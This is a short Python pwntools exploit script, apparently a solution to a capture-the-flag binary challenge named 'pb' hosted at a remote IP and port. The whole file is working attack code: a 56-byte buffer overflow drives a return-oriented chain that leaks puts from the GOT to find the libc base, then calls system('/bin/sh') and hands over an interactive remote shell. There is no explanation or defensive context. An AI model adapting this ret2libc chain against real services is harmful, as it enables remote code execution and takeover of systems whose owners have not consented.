#!/usr/bin/env python3



from pwn import *

e = ELF("./pb")
#r = process("./pb")
r = remote("104.248.170.125",32419)
libc = ELF("glibc/libc.so.6")
r.sendline(b"2")
exploit = b"A" * 56 + p64(0x40142b) + p64(e.got.puts) + p64(e.plt.puts) + p64(e.sym.box)
r.sendline(exploit)
r.recvuntil(b"We will deliver the mythical box to the Library for analysis, thank you!\n\n")
leak = u64(r.recvuntil(b"\x7f").decode('latin-1').ljust(8,'\x00')) - libc.sym.puts
log.info("The libc base of the process is " + hex(leak))
r.sendline(b"2")
exploit = b"A" * 56 + p64(0x40142b) + p64(leak + next(libc.search(b"/bin/sh\x00"))) + p64(0x40142c) + p64(leak + libc.sym.system)
r.sendline(exploit)
r.interactive()
